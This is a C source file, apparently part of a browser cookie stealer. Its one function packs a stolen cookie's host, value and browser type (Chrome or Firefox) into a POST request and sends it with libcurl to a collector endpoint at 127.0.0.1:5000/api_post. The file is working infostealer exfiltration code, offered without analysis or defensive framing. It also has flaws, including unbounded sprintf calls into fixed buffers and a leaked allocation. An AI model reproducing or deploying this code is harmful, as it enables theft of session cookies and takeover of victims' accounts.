#include "send.h"

#include <string.h>
#include <curl/curl.h>


/* Will send one cookie pair (host:value).
*/
uint8_t send_single_cookie(cookies_datatype c_value)
{
    printf("[curl] Initialising curl...\n");
    CURL* curl;
    curl = curl_easy_init();
    printf("[curl] Passed. Curl was initialised.\n");

    if (!curl)
        return 0;

    char q_host[134];
    char q_value[1032];
    char q_btype[16];

    sprintf(q_host, "host=%s", c_value.host);
    sprintf(q_value, "value=%s&", c_value.value);

    if (c_value.b_type == 1)
        strcpy(q_btype, "b_type=google&");

    else if (c_value.b_type == 2)
        strcpy(q_btype, "b_type=firefox&");

    else
        return 0;


    char *post_data;
    post_data = (char *)malloc(sizeof(q_btype) + sizeof(q_value) + sizeof(q_host) + 1);
    sprintf(post_data, "%s%s%s", q_btype, q_value, q_host);

    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/api_post");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(post_data));
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return 1;
}
